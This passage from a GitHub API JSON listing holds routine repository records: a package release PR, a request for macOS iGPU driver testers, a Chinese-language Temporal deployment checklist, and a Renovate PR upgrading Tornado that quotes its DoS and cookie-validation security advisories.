,"labels_url":"https://api.github.com/repos/imjlk/trailbase-apps-in-toss-kit/issues/222/labels{/name}","comments_url":"https://api.github.com/repos/imjlk/trailbase-apps-in-toss-kit/issues/222/comments","events_url":"https://api.github.com/repos/imjlk/trailbase-apps-in-toss-kit/issues/222/events","html_url":"https://github.com/imjlk/trailbase-apps-in-toss-kit/pull/222","id":6299452315,"node_id":"PR_kwDOSZT6dM8AAAABOAmslg","number":222,"title":"chore: release packages","user":{"login":"imjlk","id":67102441,"node_id":"MDQ6VXNlcjY3MTAyNDQx","avatar_url":"https://avatars.githubusercontent.com/u/67102441?v=4","gravatar_id":"","url":"https://api.github.com/users/imjlk","html_url":"https://github.com/imjlk","followers_url":"https://api.github.com/users/imjlk/followers","following_url":"https://api.github.com/users/imjlk/following{/other_user}","gists_url":"https://api.github.com/users/imjlk/gists{/gist_id}","starred_url":"https://api.github.com/users/imjlk/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/imjlk/subscriptions","organizations_url":"https://api.github.com/users/imjlk/orgs","repos_url":"https://api.github.com/users/imjlk/repos","events_url":"https://api.github.com/users/imjlk/events{/privacy}","received_events_url":"https://api.github.com/users/imjlk/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"closed","locked":false,"assignees":[],"milestone":null,"comments":2,"created_at":"2026-11-10T03:12:51Z","updated_at":"2026-11-10T15:24:03Z","closed_at":"2026-11-10T15:24:02Z","assignee":null,"author_association":"OWNER","active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/imjlk/trailbase-apps-in-toss-kit/pulls/222","html_url":"https://github.com/imjlk/trailbase-apps-in-toss-kit/pull/222","diff_url":"https://github.com/imjlk/trailbase-apps-in-toss-kit/pull/222.diff","patch_url":"https://github.com/imjlk/trailbase-apps-in-toss-kit/pull/222.patch","merged_at":"2026-11-10T15:24:02Z"},"body":"This PR was generated by [Sampo GitHub Action](https://github.com/bruits/sampo/blob/main/crates/sampo-github-action/README.md). When you're ready to do a release, you can merge this and the packages will be published automatically. Not ready yet? Just keep adding changesets to the default branch, and this PR will stay up to date.\n\n## @trailbase-apps-in-toss-kit/ait-core (npm) 0.3.0 -> 0.3.1\n\n### Patch changes\n\n- [c478963](https://github.com/imjlk/trailbase-apps-in-toss-kit/commit/c4789634d19b35989723f711fd0c244bb20603c9) Adopt `@ait-kit/sdk` 0.8.0 and `@ait-kit/api-core` / `@ait-kit/api-client` 0.7.0 (exact pins).\n  \n  - Anonymous key lookups now share one pending SDK call per adapter on RN and WebView. When the Toss app never answers, repeated session reads that hit the kit's 10-second deadline no longer leave a new bridge call behind each time; at most one stays pending. The kit's deadline and error handling are unchanged, and it does not pass the SDK's opt-in `timeoutMs`.\n  - `ait-web` imports the `createWebView*` factories from `@ait-kit/sdk/webview` instead of the deprecated `@ait-kit/sdk/web` aliases. `createAppsInTossSdkStorageBridge` now types its options as `WebViewStorageOptions`, the same type under its current name. No behaviour changes.\n  - The proxy's anonymous auth-code exchange route now uses the exchange that `@ait-kit/api-core` provides directly, instead of a local wrapper around the standalone helper. The route path is pinned to `@ait-kit/api-client` `PROXY_ENDPOINTS.anonAuthCodeExchange`, so `TossMtlsHttpClient.anonAuthCodeExchange({ code })` reaches it. The request, the single attempt with no retry, and the response shape are unchanged, and stub mode still returns `FORWARD_MODE_REQUIRED`. — Thanks @imjlk!\n\n## @trailbase-apps-in-toss-kit/ait-rn (npm) 0.10.1 -> 0.10.2\n\n### Patch changes\n\n- [c478963](https://github.com/imjlk/trailbase-apps-in-toss-kit/commit/c4789634d19b35989723f711fd0c244bb20603c9) Adopt `@ait-kit/sdk` 0.8.0 and `@ait-kit/api-core` / `@ait-kit/api-client` 0.7.0 (exact pins).\n  \n  - Anonymous key lookups now share one pending SDK call per adapter on RN and WebView. When the Toss app never answers, repeated session reads that hit the kit's 10-second deadline no longer leave a new bridge call behind each time; at most one stays pending. The kit's deadline and error handling are unchanged, and it does not pass the SDK's opt-in `timeoutMs`.\n  - `ait-web` imports the `createWebView*` factories from `@ait-kit/sdk/webview` instead of the deprecated `@ait-kit/sdk/web` aliases. `createAppsInTossSdkStorageBridge` now types its options as `WebViewStorageOptions`, the same type under its current name. No behaviour changes.\n  - The proxy's anonymous auth-code exchange route now uses the exchange that `@ait-kit/api-core` provides directly, instead of a local wrapper around the standalone helper. The route path is pinned to `@ait-kit/api-client` `PROXY_ENDPOINTS.anonAuthCodeExchange`, so `TossMtlsHttpClient.anonAuthCodeExchange({ code })` reaches it. The request, the single attempt with no retry, and the response shape are unchanged, and stub mode still returns `FORWARD_MODE_REQUIRED`. — Thanks @imjlk!\n- Updated dependencies: ait-core (npm)@0.3.1\n\n## @trailbase-apps-in-toss-kit/ait-web (npm) 0.6.0 -> 0.6.1\n\n### Patch changes\n\n- [c478963](https://github.com/imjlk/trailbase-apps-in-toss-kit/commit/c4789634d19b35989723f711fd0c244bb20603c9) Adopt `@ait-kit/sdk` 0.8.0 and `@ait-kit/api-core` / `@ait-kit/api-client` 0.7.0 (exact pins).\n  \n  - Anonymous key lookups now share one pending SDK call per adapter on RN and WebView. When the Toss app never answers, repeated session reads that hit the kit's 10-second deadline no longer leave a new bridge call behind each time; at most one stays pending. The kit's deadline and error handling are unchanged, and it does not pass the SDK's opt-in `timeoutMs`.\n  - `ait-web` imports the `createWebView*` factories from `@ait-kit/sdk/webview` instead of the deprecated `@ait-kit/sdk/web` aliases. `createAppsInTossSdkStorageBridge` now types its options as `WebViewStorageOptions`, the same type under its current name. No behaviour changes.\n  - The proxy's anonymous auth-code exchange route now uses the exchange that `@ait-kit/api-core` provides directly, instead of a local wrapper around the standalone helper. The route path is pinned to `@ait-kit/api-client` `PROXY_ENDPOINTS.anonAuthCodeExchange`, so `TossMtlsHttpClient.anonAuthCodeExchange({ code })` reaches it. The request, the single attempt with no retry, and the response shape are unchanged, and stub mode still returns `FORWARD_MODE_REQUIRED`. — Thanks @imjlk!\n- Updated dependencies: ait-core (npm)@0.3.1\n\n## @trailbase-apps-in-toss-kit/toss-mtls-client-proxy (npm) 0.7.2 -> 0.7.3\n\n### Patch changes\n\n- [c478963](https://github.com/imjlk/trailbase-apps-in-toss-kit/commit/c4789634d19b35989723f711fd0c244bb20603c9) Adopt `@ait-kit/sdk` 0.8.0 and `@ait-kit/api-core` / `@ait-kit/api-client` 0.7.0 (exact pins).\n  \n  - Anonymous key lookups now share one pending SDK call per adapter on RN and WebView. When the Toss app never answers, repeated session reads that hit the kit's 10-second deadline no longer leave a new bridge call behind each time; at most one stays pending. The kit's deadline and error handling are unchanged, and it does not pass the SDK's opt-in `timeoutMs`.\n  - `ait-web` imports the `createWebView*` factories from `@ait-kit/sdk/webview` instead of the deprecated `@ait-kit/sdk/web` aliases. `createAppsInTossSdkStorageBridge` now types its options as `WebViewStorageOptions`, the same type under its current name. No behaviour changes.\n  - The proxy's anonymous auth-code exchange route now uses the exchange that `@ait-kit/api-core` provides directly, instead of a local wrapper around the standalone helper. The route path is pinned to `@ait-kit/api-client` `PROXY_ENDPOINTS.anonAuthCodeExchange`, so `TossMtlsHttpClient.anonAuthCodeExchange({ code })` reaches it. The request, the single attempt with no retry, and the response shape are unchanged, and stub mode still returns `FORWARD_MODE_REQUIRED`. — Thanks @imjlk!\n\n\n\n<!-- This is an auto-generated comment: release notes by coderabbit.ai -->\n\n<!-- coderabbit-ai-generated:v1 -->\n\n## Summary by CodeRabbit\n\n* **Documentation**\n  * Added release notes for the core, React Native, WebView, and proxy packages, covering shared anonymous-key lookups, WebView SDK updates, and proxy auth-code exchange routing.\n* **Chores**\n  * Updated package versions: core to 0.3.1, React Native to 0.10.2, WebView to 0.6.1, and the proxy to 0.7.3.\n\n<!-- end of auto-generated comment: release notes by coderabbit.ai -->","reactions":{"url":"https://api.github.com/repos/imjlk/trailbase-apps-in-toss-kit/issues/222/reactions","total_count":1,"+1":1,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/imjlk/trailbase-apps-in-toss-kit/issues/222/timeline","performed_via_github_app":null,"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/ydd1126/skybreak/issues/1","repository_url":"https://api.github.com/repos/ydd1126/skybreak","labels_url":"https://api.github.com/repos/ydd1126/skybreak/issues/1/labels{/name}","comments_url":"https://api.github.com/repos/ydd1126/skybreak/issues/1/comments","events_url":"https://api.github.com/repos/ydd1126/skybreak/issues/1/events","html_url":"https://github.com/ydd1126/skybreak/issues/1","id":6123238072,"node_id":"I_kwDOVVZiTs8AAAABbPkyuA","number":1,"title":"Would you test an Intel iGPU driver for macOS on your Core Ultra desktop? (XeGfx)","user":{"login":"watchthelight","id":167818006,"node_id":"U_kgDOCgCzFg","avatar_url":"https://avatars.githubusercontent.com/u/167818006?v=4","gravatar_id":"","url":"https://api.github.com/users/watchthelight","html_url":"https://github.com/watchthelight","followers_url":"https://api.github.com/users/watchthelight/followers","following_url":"https://api.github.com/users/watchthelight/following{/other_user}","gists_url":"https://api.github.com/users/watchthelight/gists{/gist_id}","starred_url":"https://api.github.com/users/watchthelight/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/watchthelight/subscriptions","organizations_url":"https://api.github.com/users/watchthelight/orgs","repos_url":"https://api.github.com/users/watchthelight/repos","events_url":"https://api.github.com/users/watchthelight/events{/privacy}","received_events_url":"https://api.github.com/users/watchthelight/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":6,"created_at":"2026-10-30T16:46:45Z","updated_at":"2026-11-10T15:10:02Z","closed_at":null,"assignee":null,"author_association":"NONE","active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"Hi @ydd1126,\n\nI came across this repo while looking for people running macOS on Arrow Lake hardware, and your Core Ultra desktop (Core Ultra 5 245K) is the kind of machine I need reports from.\n\nI work on [XeGfx](https://github.com/watchthelight-labs/XeGfx), an open-source driver that brings Metal and Vulkan to Intel's integrated GPUs on macOS. It runs on two 275HX laptops so far. Every other Arrow Lake model, H, U or desktop, is still untested.\n\nWould you be willing to help? The first step is only information, with nothing to install:\n\n- the iGPU device ID: `ioreg -l | grep -i '\"device-id\"'` on the IGPU or GFX0 entry (or `lspci -nn | grep VGA` from Linux)\n- your macOS version, and the BIOS graphics mode (hybrid, discrete only or iGPU only)\n- whether the iGPU is enabled or blocked in your OpenCore config\n\nIf you want to go further later, there is a read-only probe that only reads registers and never loads at boot ([how to run it](https://github.com/watchthelight-labs/XeGfx/blob/main/CONTRIBUTING.md#testing-on-your-machine), reports go in [XeGfx #3](https://github.com/watchthelight-labs/XeGfx/issues/3)).\n\nWhatever you send, whether it works, half works or fails, gets you credited in the XeGfx README. If you'd rather not, no problem, just close this.\n\n（中文回复也可以。任何结果，无论成功或失败，都会在 XeGfx 的 README 中署名致谢。）\n","reactions":{"url":"https://api.github.com/repos/ydd1126/skybreak/issues/1/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/ydd1126/skybreak/issues/1/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/davidlinnnn/data-ingestion/issues/137","repository_url":"https://api.github.com/repos/davidlinnnn/data-ingestion","labels_url":"https://api.github.com/repos/davidlinnnn/data-ingestion/issues/137/labels{/name}","comments_url":"https://api.github.com/repos/davidlinnnn/data-ingestion/issues/137/comments","events_url":"https://api.github.com/repos/davidlinnnn/data-ingestion/issues/137/events","html_url":"https://github.com/davidlinnnn/data-ingestion/issues/137","id":6115655057,"node_id":"I_kwDOUAWcGs8AAAABbIV9kQ","number":137,"title":"公司環境確認：#80 的 V1 與 V8 在公司 Temporal 重跑","user":{"login":"davidlinnnn","id":319735910,"node_id":"U_kgDOEw7IZg","avatar_url":"https://avatars.githubusercontent.com/u/319735910?v=4","gravatar_id":"","url":"https://api.github.com/users/davidlinnnn","html_url":"https://github.com/davidlinnnn","followers_url":"https://api.github.com/users/davidlinnnn/followers","following_url":"https://api.github.com/users/davidlinnnn/following{/other_user}","gists_url":"https://api.github.com/users/davidlinnnn/gists{/gist_id}","starred_url":"https://api.github.com/users/davidlinnnn/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/davidlinnnn/subscriptions","organizations_url":"https://api.github.com/users/davidlinnnn/orgs","repos_url":"https://api.github.com/users/davidlinnnn/repos","events_url":"https://api.github.com/users/davidlinnnn/events{/privacy}","received_events_url":"https://api.github.com/users/davidlinnnn/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":11916632541,"node_id":"LA_kwDOUAWcGs8AAAACxklh3Q","url":"https://api.github.com/repos/davidlinnnn/data-ingestion/labels/enhancement","name":"enhancement","color":"a2eeef","default":true,"description":"New feature or request","archived_at":null,"archived_by":null},{"id":12893264487,"node_id":"LA_kwDOUAWcGs8AAAADAH-aZw","url":"https://api.github.com/repos/davidlinnnn/data-ingestion/labels/ready-for-human","name":"ready-for-human","color":"C2E0C6","default":false,"description":"Requires human implementation","archived_at":null,"archived_by":null}],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":4,"created_at":"2026-10-30T08:17:08Z","updated_at":"2026-11-10T15:09:57Z","closed_at":null,"assignee":null,"author_association":"OWNER","active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":1,"total_blocked_by":3,"blocking":0,"total_blocking":0},"body":"> 2026-11-10 修訂（#178 不用 operator；細節見 #129「實作修正 — 2026-11-10」與 [`profiles/README.md`](https://github.com/davidlinnnn/data-ingestion/blob/dev/src/kp_canonicalization/profiles/README.md)）：\n> - 2026-11-09 更正裡的 Controller、ApplicationSet、Image Updater 全部作廢：一個 profile 版本一個 Worker Deployment（含五條 queue），Helm chart 依 values 的 `builds` 清單產生 Deployment，promoter CronJob 切 current。下方三項「（必要，#178）」已改寫。\n> - 「設定公司 Temporal」第 5 步：Deployment 由 chart 依 build 產生，名稱含 image tag；HPA 跟著每個 build 的 Deployment。\n>\n> 2026-11-09 更正（#178，細節見 #129「實作修正 — 2026-11-09」與 [`profiles/README.md`](https://github.com/davidlinnnn/data-ingestion/blob/dev/src/kp_canonicalization/profiles/README.md)）：\n> - V1 重跑改在新形狀上做：一個 profile 版本一組 task queue、每條 queue 一個 Worker Deployment、Temporal Worker Controller 升 current。沒有 override，所以「override 到非 current build」作廢；「兩 build 並存」改為同一個 deployment 的修補版本並存。\n> - 「若 V1 在公司環境失敗 → fallback（每 release 一組 task queue）」作廢：這已是主設計。\n> - 「設定公司 Temporal」第 5 步的 Deployment 改由 ApplicationSet 與 Controller 產生。第 7 步的 `--task-queue inference` 改用帶 profile 版本的 queue 名稱。\n> - 本票 2026-11-09 留言寫「確認 Controller 以 `sunset` 收掉版本」，只適用修補。退役走 CR 的 finalizer，不經過 `sunset`，見下方的必要驗證。\n>\n> 2026-11-04 更正（細節見[留言](https://github.com/davidlinnnn/data-ingestion/issues/137#issuecomment-6633654253)）：\n> - V8 的「有效併發 ≤ 28」改為 **≤ 20**（1 個 vlm worker × 5 slots × c=4；28 來自已撤銷的六條 tier queue）。\n> - 「設定公司 Temporal」第 1 步建好 namespace 後，先把 `DocumentUid`、`SourceRevisionId`、`TraceId` 註冊為 Keyword search attribute，否則 workflow 無法啟動。\n> - V8 可沿用 t7 harness 的判定，但要先加上連公司 Temporal、VLM、MinIO 的設定。\n\n## 背景\n\n#80 的本機驗收（#129）以本機 Temporal 預演 V1、以假 VLM 量 V8。這兩項的最終確認需要公司的 Temporal 環境與公司 VLM，只有人能做。本票不是 #80 的子票；#80 以本機證據結案，不等本票。\n\n## 要做的事\n\n- [ ] 在公司 Temporal（最新 Helm chart release，Worker Versioning 已就緒）重跑 V1：Pinned 啟動、override 到非 current build、兩 build 並存、退役；對照本機報告，差異記錄\n- [ ] 在公司環境以 pilot 形狀（1 個 orchestration worker＋3 個 inference worker、真公司 VLM）重跑 V8：5 篇同時、有效併發 ≤ 28、每篇到 processing complete 的時間；若 Retrieval 已存在，量到可搜尋\n- [ ] 對照 V10（公司 VLM 探測）的 TPM、延遲、strict JSON 支援結果，更新 `paper-pdf@1` 的 `runtime` 初始參數建議（以新 profile 版本為單位）\n- [ ] 若 V1 在公司環境失敗 → 啟用設計的 fallback（每 release 一組 task queue，#33 T08），交 #78\n- [ ] 結果回填 #80 與 #78\n- [ ] 確認公司託管 MinIO 的相容性（2026-10-30 新增，見 #129「實作修正」與 #57 的留言）：(1) 版本，以及是否為商業版 AIStor；conditional write 需要 2023-02 之後的版本，分散式叢集還要確認已修正「read quorum 不足時 conditional PUT 仍照常寫入」的問題。(2) 用一個測試 bucket，把 `KP_S3_*` 指向公司端點跑 `pytest -m s3`，7 個全過才算相容。(3) 若上傳出現 checksum 錯誤，設定 `AWS_REQUEST_CHECKSUM_CALCULATION=WHEN_REQUIRED` 後重跑並記錄。結果回填 #57。\n- [ ] 設定公司 Temporal（2026-10-31 新增，理由見 #129「實作修正 — 2026-10-31」，本機證據在 `docs/validation/80/t2-queue-split/`）：\n  1. 建 namespace `knowledge-canonicalization-<env>`（例如 `-dev`、`-prod`）；worker 以 `TEMPORAL_NAMESPACE` 指向它。\n  2. Task Queue Priority：最新版預設開啟，確認 dynamic config 沒有把 `matching.useNewMatcher` 設成 `false`。\n  3. 對這個 namespace 設 `matching.numTaskqueueReadPartitions=1` 與 `matching.numTaskqueueWritePartitions=1`（以 namespace 為 constraint），priority 才會嚴格依序。要在 worker 第一次連上、queue 建立之前設好。\n  4. Fairness 暫不開（`matching.enableFairness`），等 #88 決定「大批 vs 零星」再說。\n  5. 部署：`orchestration`、`inference` 各一個 Deployment，每個至少 2 個副本，依各自的 queue backlog 擴縮（HPA＋Prometheus Adapter；要縮到 0 才用 KEDA Temporal scaler）。inference pod 的 `terminationGracePeriodSeconds` 要大於 worker 的 `--shutdown-grace-s`。\n  6. 物件儲存：每個 worker 啟動時會在 `worker-probes/` 寫一個探測物件（write-once 自我檢查），對這個前綴設 1 天的生命週期規則，讓它自動清掉。\n  7. 驗證：照 `docs/validation/80/t2-tracer-bullet/priority.py` 的做法在公司 namespace 重做一次（該腳本自己起 dev server，要改成連公司端點），bulk 佔滿時 normal 每次都排在最前面；並用 `temporal task-queue describe --task-queue inference` 確認 partition 數與 backlog 看得到。\n- [ ] **（必要，#178，2026-11-10 改寫）chart 與 promoter 接上自建 Temporal**：Helm chart 依 values 的 `profiles.<version>.builds` 為每個 build 產生五個 Deployment（名稱含 image tag；pod 帶 `TEMPORAL_DEPLOYMENT_NAME`、`TEMPORAL_WORKER_BUILD_ID` 與 label `kp.profile`）和一個記錄想要的 build 的 ConfigMap；promoter 腳本（#135 第二段）包成每分鐘一次的 CronJob，連得到 Temporal。確認：(1) Server 版本 ≥ 1.31（API 自 1.31.0 GA；1.30.0 前版本 GC 壞掉）；(2) CD pipeline 觸發的 `argocd app sync` 有沒有帶 `--prune`，沒有的話拿掉 tag 不會刪 Deployment，要補 delete 的做法；(3) 在目標 Server 版本重跑 P8（[`docs/validation/178/mixed_queue_probe.py`](https://github.com/davidlinnnn/data-ingestion/blob/dev/docs/validation/178/mixed_queue_probe.py) 改連公司端點）：同時跑 workflow 與 Activity 的 queue 切 current 後 `routingConfigUpdateState` 須為 COMPLETED（temporalio/temporal#11842 未關閉）；(4) promoter 切不過去 10 分鐘的告警看得到。\n- [ ] **（必要，#178，2026-11-10 改寫）退役的資源量測**：部署兩個 profile 版本。確認舊版沒有採用、以 queue 名查 open workflow 為 0，再照 [`profiles/README.md` 的 Retire](https://github.com/davidlinnnn/data-ingestion/blob/dev/src/kp_canonicalization/profiles/README.md#retire-one-line-required) 量移除前後的 pod 數、replica 數、CPU 與記憶體 request、版本狀態。移除前的預期：五種 pod 各至少 1 個，版本是 current、`unspecified`（本機探針 P5）。移除後的預期：pod 為 0，promoter 在 poller 過期（預設 5 分鐘）後刪掉版本與 Worker Deployment，`describe` 回 `no Worker Deployment found`（本機探針 P6 的順序）。與實測不同時回報到 #178 並改操作文件。\n- [ ] **（必要，#178，2026-11-10 改寫）修補的兩行**：同一個 profile 版本加一個新 tag，確認五個新 Deployment 與舊的並存、promoter 在五條 queue 都有 poller 後切 current、新請求跑在新 build、進行中的 workflow 連 Activity 都留在舊 build；舊 build 在最後一個 workflow 結束後幾分鐘內 `drained`（預設 3 分鐘 grace 加 3 分鐘 refresh）；拿掉舊 tag 後 Deployment 被刪、promoter 在 poller 窗口後刪版本。另測回滾：把舊 tag 移回清單末端，一分鐘內 current 切回。\n\n## 擋住它的\n\n由原生 blocked-by 邊表示（#80 的重用與版本票、容量與時效票）。\n\n","reactions":{"url":"https://api.github.com/repos/davidlinnnn/data-ingestion/issues/137/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/davidlinnnn/data-ingestion/issues/137/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/SEA-AI/templatepy/issues/37","repository_url":"https://api.github.com/repos/SEA-AI/templatepy","labels_url":"https://api.github.com/repos/SEA-AI/templatepy/issues/37/labels{/name}","comments_url":"https://api.github.com/repos/SEA-AI/templatepy/issues/37/comments","events_url":"https://api.github.com/repos/SEA-AI/templatepy/issues/37/events","html_url":"https://github.com/SEA-AI/templatepy/pull/37","id":6294401898,"node_id":"PR_kwDOOh1aj88AAAABN8leJw","number":37,"title":"Update dependency tornado to v6.6 [SECURITY]","user":{"login":"renovate[bot]","id":29139614,"node_id":"MDM6Qm90MjkxMzk2MTQ=","avatar_url":"https://avatars.githubusercontent.com/in/2740?v=4","gravatar_id":"","url":"https://api.github.com/users/renovate%5Bbot%5D","html_url":"https://github.com/apps/renovate","followers_url":"https://api.github.com/users/renovate%5Bbot%5D/followers","following_url":"https://api.github.com/users/renovate%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/renovate%5Bbot%5D/gists{/gist_id}","starred_url":"https://api.github.com/users/renovate%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/renovate%5Bbot%5D/subscriptions","organizations_url":"https://api.github.com/users/renovate%5Bbot%5D/orgs","repos_url":"https://api.github.com/users/renovate%5Bbot%5D/repos","events_url":"https://api.github.com/users/renovate%5Bbot%5D/events{/privacy}","received_events_url":"https://api.github.com/users/renovate%5Bbot%5D/received_events","type":"Bot","user_view_type":"public","site_admin":false},"labels":[{"id":12872222784,"node_id":"LA_kwDOOh1aj88AAAAC_z6IQA","url":"https://api.github.com/repos/SEA-AI/templatepy/labels/automerge","name":"automerge","color":"ededed","default":false,"description":null,"archived_at":null,"archived_by":null},{"id":12872222805,"node_id":"LA_kwDOOh1aj88AAAAC_z6IVQ","url":"https://api.github.com/repos/SEA-AI/templatepy/labels/renovate","name":"renovate","color":"ededed","default":false,"description":null,"archived_at":null,"archived_by":null}],"state":"closed","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-11-09T20:46:24Z","updated_at":"2026-11-10T15:07:17Z","closed_at":"2026-11-10T15:07:15Z","assignee":null,"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/SEA-AI/templatepy/pulls/37","html_url":"https://github.com/SEA-AI/templatepy/pull/37","diff_url":"https://github.com/SEA-AI/templatepy/pull/37.diff","patch_url":"https://github.com/SEA-AI/templatepy/pull/37.patch","merged_at":"2026-11-10T15:07:15Z"},"body":"> [!NOTE]\n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Adoption](https://docs.renovatebot.com/merge-confidence/) | [Passing](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|---|---|\n| [tornado](http://www.tornadoweb.org/) ([source](https://redirect.github.com/tornadoweb/tornado)) | `6.4.2` → `6.6` | ![age](https://developer.mend.io/api/mc/badges/age/pypi/tornado/6.6?slim=true) | ![adoption](https://developer.mend.io/api/mc/badges/adoption/pypi/tornado/6.6?slim=true) | ![passing](https://developer.mend.io/api/mc/badges/compatibility/pypi/tornado/6.4.2/6.6?slim=true) | ![confidence](https://developer.mend.io/api/mc/badges/confidence/pypi/tornado/6.4.2/6.6?slim=true) |\n\n---\n\n### Tornado vulnerable to excessive logging caused by malformed multipart form data\n[CVE-2025-47287](https://nvd.nist.gov/vuln/detail/CVE-2025-47287) / [GHSA-7cx3-6m66-7c5m](https://redirect.github.com/advisories/GHSA-7cx3-6m66-7c5m)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Summary\n\nWhen Tornado's ``multipart/form-data`` parser encounters certain errors, it logs a warning but continues trying to parse the remainder of the data. This allows remote attackers to generate an extremely high volume of logs, constituting a DoS attack. This DoS is compounded by the fact that the logging subsystem is synchronous.\n\n##### Affected versions\n\nAll versions of Tornado prior to 6.5 are affected. The vulnerable parser is enabled by default.\n\n##### Solution\n\nUpgrade to Tornado version 6.5. In the meantime, risk can be mitigated by blocking `Content-Type: multipart/form-data` in a proxy.\n\n#### Severity\n- CVSS Score: 7.5 / 10 (High)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-7cx3-6m66-7c5m](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-7cx3-6m66-7c5m)\n- [https://nvd.nist.gov/vuln/detail/CVE-2025-47287](https://nvd.nist.gov/vuln/detail/CVE-2025-47287)\n- [https://github.com/tornadoweb/tornado/commit/b39b892bf78fe8fea01dd45199aa88307e7162f3](https://redirect.github.com/tornadoweb/tornado/commit/b39b892bf78fe8fea01dd45199aa88307e7162f3)\n- [https://lists.debian.org/debian-lts-announce/2025/05/msg00038.html](https://lists.debian.org/debian-lts-announce/2025/05/msg00038.html)\n- [https://github.com/advisories/GHSA-7cx3-6m66-7c5m](https://redirect.github.com/advisories/GHSA-7cx3-6m66-7c5m)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-7cx3-6m66-7c5m) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado has incomplete validation of cookie attributes\n[GHSA-78cv-mqj4-43f7](https://redirect.github.com/advisories/GHSA-78cv-mqj4-43f7)\n\n<details>\n<summary>More information</summary>\n\n#### Details\nValues passed to the `domain`, `path`, and `samesite` arguments of `RequestHandler.set_cookie` were not completely validated in versions of Tornado prior to 6.5.5. In particular, semicolons would be allowed, which could be used to inject attacker-controlled values for other cookie attributes.\n\n#### Severity\n- CVSS Score: 5.4 / 10 (Medium)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7)\n- [https://github.com/tornadoweb/tornado/commit/24a2d96ea115f663b223887deb0060f13974c104](https://redirect.github.com/tornadoweb/tornado/commit/24a2d96ea115f663b223887deb0060f13974c104)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.5](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.5)\n- [https://github.com/advisories/GHSA-78cv-mqj4-43f7](https://redirect.github.com/advisories/GHSA-78cv-mqj4-43f7)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-78cv-mqj4-43f7) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado is vulnerable to DoS due to too many multipart parts\n[CVE-2026-31958](https://nvd.nist.gov/vuln/detail/CVE-2026-31958) / [GHSA-qjxf-f2mg-c6mc](https://redirect.github.com/advisories/GHSA-qjxf-f2mg-c6mc)\n\n<details>\n<summary>More information</summary>\n\n#### Details\nIn versions of Tornado prior to 6.5.5, the only limit on the number of parts in `multipart/form-data` is the `max_body_size` setting (default 100MB). Since parsing occurs synchronously on the main thread, this creates the possibility of denial-of-service due to the cost of parsing very large multipart bodies with many parts. \n\nTornado 6.5.5 introduces new limits on the size and complexity of multipart bodies, including a default limit of 100 parts per request. These limits are configurable if needed; see `tornado.httputil.ParseMultipartConfig`. It is also now possible to disable `multipart/form-data` parsing entirely if it is not required for the application.\n\n#### Severity\n- CVSS Score: 8.7 / 10 (High)\n- Vector String: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-qjxf-f2mg-c6mc](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-qjxf-f2mg-c6mc)\n- [https://nvd.nist.gov/vuln/detail/CVE-2026-31958](https://nvd.nist.gov/vuln/detail/CVE-2026-31958)\n- [https://github.com/tornadoweb/tornado/commit/119a195e290c43ad2d63a2cf012c29d43d6ed839](https://redirect.github.com/tornadoweb/tornado/commit/119a195e290c43ad2d63a2cf012c29d43d6ed839)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.5](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.5)\n- 